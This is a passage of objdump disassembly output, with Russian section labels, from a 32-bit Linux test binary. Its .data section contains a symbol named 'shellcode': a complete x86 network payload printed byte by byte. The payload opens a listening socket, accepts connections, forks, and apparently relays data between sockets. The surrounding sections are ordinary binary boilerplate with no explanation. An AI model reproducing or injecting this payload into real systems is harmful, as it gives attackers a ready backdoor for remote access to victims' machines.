 8049f7d:	00 00                	add    %al,(%eax)
 8049f7f:	00 00                	add    %al,(%eax)
 8049f81:	a0 04 08 02 00       	mov    0x20804,%al
 8049f86:	00 00                	add    %al,(%eax)
 8049f88:	28 00                	sub    %al,(%eax)
 8049f8a:	00 00                	add    %al,(%eax)
 8049f8c:	14 00                	adc    $0x0,%al
 8049f8e:	00 00                	add    %al,(%eax)
 8049f90:	11 00                	adc    %eax,(%eax)
 8049f92:	00 00                	add    %al,(%eax)
 8049f94:	17                   	pop    %ss
 8049f95:	00 00                	add    %al,(%eax)
 8049f97:	00 cc                	add    %cl,%ah
 8049f99:	82                   	(bad)  
 8049f9a:	04 08                	add    $0x8,%al
 8049f9c:	11 00                	adc    %eax,(%eax)
 8049f9e:	00 00                	add    %al,(%eax)
 8049fa0:	c4 82 04 08 12 00    	les    0x120804(%edx),%eax
 8049fa6:	00 00                	add    %al,(%eax)
 8049fa8:	08 00                	or     %al,(%eax)
 8049faa:	00 00                	add    %al,(%eax)
 8049fac:	13 00                	adc    (%eax),%eax
 8049fae:	00 00                	add    %al,(%eax)
 8049fb0:	08 00                	or     %al,(%eax)
 8049fb2:	00 00                	add    %al,(%eax)
 8049fb4:	fe                   	(bad)  
 8049fb5:	ff                   	(bad)  
 8049fb6:	ff 6f a4             	ljmp   *-0x5c(%edi)
 8049fb9:	82                   	(bad)  
 8049fba:	04 08                	add    $0x8,%al
 8049fbc:	ff                   	(bad)  
 8049fbd:	ff                   	(bad)  
 8049fbe:	ff 6f 01             	ljmp   *0x1(%edi)
 8049fc1:	00 00                	add    %al,(%eax)
 8049fc3:	00 f0                	add    %dh,%al
 8049fc5:	ff                   	(bad)  
 8049fc6:	ff 6f 94             	ljmp   *-0x6c(%edi)
 8049fc9:	82                   	(bad)  
 8049fca:	04 08                	add    $0x8,%al
	...

Дизассемблирование раздела .got:

08049ffc <.got>:
 8049ffc:	00 00                	add    %al,(%eax)
	...

Дизассемблирование раздела .got.plt:

0804a000 <_GLOBAL_OFFSET_TABLE_>:
 804a000:	14 9f                	adc    $0x9f,%al
 804a002:	04 08                	add    $0x8,%al
	...
 804a00c:	36 83 04 08 46       	addl   $0x46,%ss:(%eax,%ecx,1)
 804a011:	83 04 08 56          	addl   $0x56,(%eax,%ecx,1)
 804a015:	83 04 08 66          	addl   $0x66,(%eax,%ecx,1)
 804a019:	83 04 08 76          	addl   $0x76,(%eax,%ecx,1)
 804a01d:	83                   	.byte 0x83
 804a01e:	04 08                	add    $0x8,%al

Дизассемблирование раздела .data:

0804a020 <__data_start>:
 804a020:	00 00                	add    %al,(%eax)
	...

0804a024 <__dso_handle>:
	...

0804a040 <shellcode>:
 804a040:	31 c0                	xor    %eax,%eax
 804a042:	89 c3                	mov    %eax,%ebx
 804a044:	50                   	push   %eax
 804a045:	40                   	inc    %eax
 804a046:	50                   	push   %eax
 804a047:	40                   	inc    %eax
 804a048:	50                   	push   %eax
 804a049:	89 e1                	mov    %esp,%ecx
 804a04b:	b0 66                	mov    $0x66,%al
 804a04d:	89 c7                	mov    %eax,%edi
 804a04f:	43                   	inc    %ebx
 804a050:	cd 80                	int    $0x80
 804a052:	89 c6                	mov    %eax,%esi
 804a054:	89 f8                	mov    %edi,%eax
 804a056:	31 d2                	xor    %edx,%edx
 804a058:	52                   	push   %edx
 804a059:	52                   	push   %edx
 804a05a:	52                   	push   %edx
 804a05b:	ba fd ff fa ff       	mov    $0xfffafffd,%edx
 804a060:	f7 d2                	not    %edx
 804a062:	52                   	push   %edx
 804a063:	89 e1                	mov    %esp,%ecx
 804a065:	31 d2                	xor    %edx,%edx
 804a067:	b2 10                	mov    $0x10,%dl
 804a069:	52                   	push   %edx
 804a06a:	51                   	push   %ecx
 804a06b:	56                   	push   %esi
 804a06c:	89 e1                	mov    %esp,%ecx
 804a06e:	43                   	inc    %ebx
 804a06f:	cd 80                	int    $0x80
 804a071:	53                   	push   %ebx
 804a072:	56                   	push   %esi
 804a073:	89 e1                	mov    %esp,%ecx
 804a075:	b0 66                	mov    $0x66,%al
 804a077:	b3 04                	mov    $0x4,%bl
 804a079:	cd 80                	int    $0x80
 804a07b:	31 c9                	xor    %ecx,%ecx
 804a07d:	41                   	inc    %ecx
 804a07e:	b3 11                	mov    $0x11,%bl
 804a080:	b0 30                	mov    $0x30,%al
 804a082:	cd 80                	int    $0x80
 804a084:	31 c0                	xor    %eax,%eax
 804a086:	50                   	push   %eax
 804a087:	50                   	push   %eax
 804a088:	56                   	push   %esi
 804a089:	89 e1                	mov    %esp,%ecx
 804a08b:	b0 66                	mov    $0x66,%al
 804a08d:	89 c2                	mov    %eax,%edx
 804a08f:	b3 05                	mov    $0x5,%bl
 804a091:	cd 80                	int    $0x80
 804a093:	89 c7                	mov    %eax,%edi
 804a095:	31 c0                	xor    %eax,%eax
 804a097:	50                   	push   %eax
 804a098:	40                   	inc    %eax
 804a099:	50                   	push   %eax
 804a09a:	40                   	inc    %eax
 804a09b:	50                   	push   %eax
 804a09c:	cd 80                	int    $0x80
 804a09e:	85 c0                	test   %eax,%eax
 804a0a0:	75 e2                	jne    804a084 <shellcode+0x44>
 804a0a2:	89 e1                	mov    %esp,%ecx
 804a0a4:	b0 66                	mov    $0x66,%al
 804a0a6:	89 c3                	mov    %eax,%ebx
 804a0a8:	b3 01                	mov    $0x1,%bl
 804a0aa:	cd 80                	int    $0x80
 804a0ac:	89 c6                	mov    %eax,%esi
 804a0ae:	b0 10                	mov    $0x10,%al
 804a0b0:	29 c4                	sub    %eax,%esp
 804a0b2:	89 e1                	mov    %esp,%ecx
 804a0b4:	31 c0                	xor    %eax,%eax
 804a0b6:	50                   	push   %eax
 804a0b7:	52                   	push   %edx
 804a0b8:	51                   	push   %ecx
 804a0b9:	57                   	push   %edi
 804a0ba:	89 e1                	mov    %esp,%ecx
 804a0bc:	b0 66                	mov    $0x66,%al
 804a0be:	b3 0a                	mov    $0xa,%bl
 804a0c0:	cd 80                	int    $0x80
 804a0c2:	b0 66                	mov    $0x66,%al
 804a0c4:	b3 03                	mov    $0x3,%bl
 804a0c6:	89 34 24             	mov    %esi,(%esp)
 804a0c9:	cd 80                	int    $0x80
 804a0cb:	85 c0                	test   %eax,%eax
 804a0cd:	74 14                	je     804a0e3 <shellcode+0xa3>
 804a0cf:	89 f3                	mov    %esi,%ebx
 804a0d1:	31 c0                	xor    %eax,%eax
 804a0d3:	b0 06                	mov    $0x6,%al
 804a0d5:	cd 80                	int    $0x80
 804a0d7:	87 f7                	xchg   %esi,%edi
 804a0d9:	85 c0                	test   %eax,%eax
 804a0db:	74 0f                	je     804a0ec <shellcode+0xac>
 804a0dd:	31 c0                	xor    %eax,%eax
 804a0df:	b0 01                	mov    $0x1,%al
 804a0e1:	cd 80                	int    $0x80
 804a0e3:	31 db                	xor    %ebx,%ebx
 804a0e5:	b3 10                	mov    $0x10,%bl
 804a0e7:	01 dc                	add    %ebx,%esp
 804a0e9:	87 f7                	xchg   %esi,%edi
 804a0eb:	31 c0                	xor    %eax,%eax
 804a0ed:	50                   	push   %eax
 804a0ee:	56                   	push   %esi
 804a0ef:	89 e3                	mov    %esp,%ebx
 804a0f1:	31 c9                	xor    %ecx,%ecx
 804a0f3:	41                   	inc    %ecx
 804a0f4:	89 ca                	mov    %ecx,%edx
 804a0f6:	b0 a8                	mov    $0xa8,%al
 804a0f8:	cd 80                	int    $0x80
 804a0fa:	31 c0                	xor    %eax,%eax
 804a0fc:	b0 40                	mov    $0x40,%al
 804a0fe:	89 e2                	mov    %esp,%edx
 804a100:	50                   	push   %eax
 804a101:	b0 08                	mov    $0x8,%al
 804a103:	50                   	push   %eax
 804a104:	52                   	push   %edx
 804a105:	56                   	push   %esi
 804a106:	89 e1                	mov    %esp,%ecx
 804a108:	31 db                	xor    %ebx,%ebx
 804a10a:	b3 0a                	mov    $0xa,%bl
 804a10c:	31 c0                	xor    %eax,%eax
 804a10e:	b0 66                	mov    $0x66,%al
 804a110:	cd 80                	int    $0x80
 804a112:	85 c0                	test   %eax,%eax
 804a114:	74 b9                	je     804a0cf <shellcode+0x8f>
 804a116:	89 da                	mov    %ebx,%edx
 804a118:	f6 c2 01             	test   $0x1,%dl
 804a11b:	75 c6                	jne    804a0e3 <shellcode+0xa3>
 804a11d:	89 c2                	mov    %eax,%edx
 804a11f:	d1 e2                	shl    %edx
 804a121:	72 c0                	jb     804a0e3 <shellcode+0xa3>
 804a123:	89 41 08             	mov    %eax,0x8(%ecx)
 804a126:	89 39                	mov    %edi,(%ecx)
 804a128:	4b                   	dec    %ebx
 804a129:	eb e1                	jmp    804a10c <shellcode+0xcc>
	...

Дизассемблирование раздела .bss:

0804a12c <__bss_start>:
 804a12c:	00 00                	add    %al,(%eax)
	...

Дизассемблирование раздела .comment:

00000000 <.comment>:
   0:	47                   	inc    %edi
   1:	43                   	inc    %ebx
   2:	43                   	inc    %ebx
   3:	3a 20                	cmp    (%eax),%ah
   5:	28 55 62             	sub    %dl,0x62(%ebp)
   8:	75 6e                	jne    78 <_init-0x804827c>
   a:	74 75                	je     81 <_init-0x8048273>
   c:	20 34 2e             	and    %dh,(%esi,%ebp,1)
   f:	38 2e                	cmp    %ch,(%esi)
  11:	34 2d                	xor    $0x2d,%al
  13:	32 75 62             	xor    0x62(%ebp),%dh
  16:	75 6e                	jne    86 <_init-0x804826e>
  18:	74 75                	je     8f <_init-0x8048265>
  1a:	31 7e 31             	xor    %edi,0x31(%esi)
  1d:	34 2e                	xor    $0x2e,%al
  1f:	30 34 29             	xor    %dh,(%ecx,%ebp,1)
  22:	20 34 2e             	and    %dh,(%esi,%ebp,1)
  25:	38 2e                	cmp    %ch,(%esi)
  27:	34 00                	xor    $0x0,%al
  29:	47                   	inc    %edi
  2a:	43                   	inc    %ebx
  2b:	43                   	inc    %ebx
  2c:	3a 20                	cmp    (%eax),%ah
  2e:	28 55 62             	sub    %dl,0x62(%ebp)
  31:	75 6e                	jne    a1 <_init-0x8048253>
  33:	74 75                	je     aa <_init-0x804824a>
  35:	20 34 2e             	and    %dh,(%esi,%ebp,1)
  38:	38 2e                	cmp    %ch,(%esi)
  3a:	32 2d 31 39 75 62    	xor    0x62753931,%ch
  40:	75 6e                	jne    b0 <_init-0x8048244>
  42:	74 75                	je     b9 <_init-0x804823b>
  44:	31 29                	xor    %ebp,(%ecx)
  46:	20 34 2e             	and    %dh,(%esi,%ebp,1)
  49:	38 2e                	cmp    %ch,(%esi)
  4b:	32 00                	xor    (%eax),%al
